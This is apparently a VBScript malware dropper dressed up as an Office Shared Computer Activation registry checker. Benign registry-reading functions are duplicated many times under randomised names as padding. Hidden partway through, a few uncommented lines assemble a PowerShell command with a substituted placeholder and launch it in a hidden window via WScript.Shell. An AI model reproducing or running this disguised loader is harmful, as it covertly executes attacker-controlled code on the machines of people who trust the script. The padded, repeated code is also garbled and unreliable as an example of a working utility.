        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function

'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////


'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function




'////////////////////////////////////////////////////////////////////////////////////////
'Checks the registry for a particular IkPKO that enables SCA in one specific
'flavor and returns whether SCA is enabled or disabled. Flavors are SCA Experiment,
'SCA Experiment override, SCA for O15 and SCA for O16
Function kLXyv(flavor)

    On Error Resume Next

    dim IkPKO, weUgd, IkPKOType, result

    Select Case flavor
        Case VALUE_SCAEXP_FLAVOR
            IkPKO =  REG_SCAEXP_BASE
            weUgd = MSG_SCAEXP
            IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE
        Case VALUE_SCAEXP_OVERRIDE_FLAVOR
            IkPKO = REG_SCAEXP_OVERRIDE
            weUgd = MSG_SCAEXP_OVERRIDE
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCAO15_FLAVOR
            IkPKO = REG_SCAO15
            weUgd = MSG_SCAO15
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case VALUE_SCA016_FLAVOR
            IkPKO = REG_SCAO16
            weUgd = MSG_SCAO16
            IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE
        Case Else
    End Select

    result = False
    If (IkPKOType = VALUE_SCAREGKEY_SINGLE_TYPE) Then
        result = PMhKc(IkPKO, weUgd)
    ElseIf (IkPKOType = VALUE_SCAREGKEY_PER_APP_TYPE) Then
        Dim appsList
        Set appsList = CreateObject("System.Collections.ArrayList")

        appsList.Add("word")
        appsList.Add("excel")
        appsList.Add("powerpoint")
        appsList.Add("visio")
        appsList.Add("project")
        appsList.Add("onenote")
        appsList.Add("outlook")
        appsList.Add("access")
        appsList.Add("publisher")
        appsList.Add("lync")

        Dim app, CfRgfffb
        For Each app In appsList
            CfRgfffb = IkPKO & app & REG_SCAEXP_END
            result = result Or PMhKc(CfRgfffb, weUgd)
        Next
    End If

    kLXyv = result
End Function


jfroc = jfroc & ";$KByHL = $KByHL.replace('%pzAcOgInMr%', '" & uRUs & "');powershell -command $KByHL;" 
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
set btgcu =  CreateObject("WScript.Shell")
'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
btgcu.Run "powershell -command " & (jfroc) , 0, false


'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function


'////////////////////////////////////////////////////////////////////////////////////////
'////////////////////////////////////////////////////////////////////////////////////////
'Reads the registry looking for a SCA IkPKO and if found reports whether or not
'that IkPKO enables SCA.
Function PMhKc(IkPKO, weUgd)

    On Error Resume Next

    Dim result, IkPKOValue
    IkPKOValue = WshShell.RegRead(IkPKO)

    If Err.Number = 0 Then
        If IkPKOValue = 1 Then
            WScript.Echo weUgd & MSG_SCAREGKEY_ACTIVE
            result = True
        Else
            WScript.Echo weUgd & MSG_SCAREGKEY_INACTIVE
            result = False
        End If

        WScript.Echo IkPKO
        WScript.Echo MSG_SEPERATESMALL
    Else
        result = False
    End If
    Err.Clear

    PMhKc = result
End Function






